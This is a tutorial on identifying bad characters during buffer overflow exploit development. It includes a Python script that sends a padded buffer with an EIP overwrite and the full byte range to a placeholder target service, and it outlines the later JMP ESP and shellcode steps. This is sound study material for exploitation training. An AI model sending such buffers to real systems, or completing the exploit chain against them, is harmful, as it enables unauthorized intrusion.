# Finding Bad Characters

## Overview
When developing buffer overflow exploits, certain characters may be filtered, modified, or misinterpreted by the target application. These "bad characters" must be identified and excluded from shellcode to ensure successful exploitation.

## Key Concepts

- **Bad Characters**: Bytes that are altered, filtered, or cause issues when processed by the target application
- **Purpose**: Identify all characters that cannot be used in shellcode
- **Common Bad Characters**: Null byte (\\x00), carriage return (\\x0D), line feed (\\x0A), etc.

## Process

1. **Generate Character Array**: Create a byte array containing all possible characters (\\x00 through \\xFF)
2. **Create Test Buffer**:
   - "A"s up to the offset
   - "B"s to overwrite EIP (4 bytes)
   - Character array to test for bad characters
   
3. **Send to Target**: Send the crafted buffer to the vulnerable application
4. **Analyze Memory**: Examine the memory dump to identify which characters are corrupted or missing
5. **Refine and Repeat**: Remove identified bad characters and test again until all bad characters are found

## Python Script Example

```python
#!/usr/bin/python
import socket, sys

# All characters from \x00 to \xFF except known bad chars
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

offset = 2040  # Replace with your confirmed offset
buffer = b"A" * offset + b"B" * 4 + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('TARGET_IP', TARGET_PORT))
    s.send(('COMMAND ' + buffer.decode(errors='ignore') + '\r\n').encode())
    s.close()
    print("Bad character buffer sent")
except:
    print("Error connecting to server")
    sys.exit()
```

## Analysis Techniques

1. **Visual Inspection**: Compare the memory dump with the original character array
2. **Sequential Analysis**: Check if each byte appears correctly in sequence
3. **Pattern Disruption**: Look for where the sequence gets corrupted
4. **Iterative Refinement**: Remove identified bad characters and test again

## Common Bad Characters

- **\\x00** (Null byte): Almost always a bad character, terminates strings
- **\\x0A** (Line feed): Often problematic in text-based protocols
- **\\x0D** (Carriage return): Often problematic in text-based protocols
- **\\xFF**: Can cause issues in some applications
- Application-specific characters: Depend on how the application processes input

## Important Considerations

- The null byte (\\x00) is almost always a bad character
- Some characters may cause others to be misinterpreted
- Testing must be methodical and thorough
- Missed bad characters can cause shellcode to fail
- Some applications may have multiple bad characters

## Next Steps After Identifying Bad Characters

After identifying all bad characters:
1. Find a suitable module with a "JMP ESP" instruction
2. Generate shellcode avoiding the identified bad characters
3. Complete the exploit with the appropriate memory structure
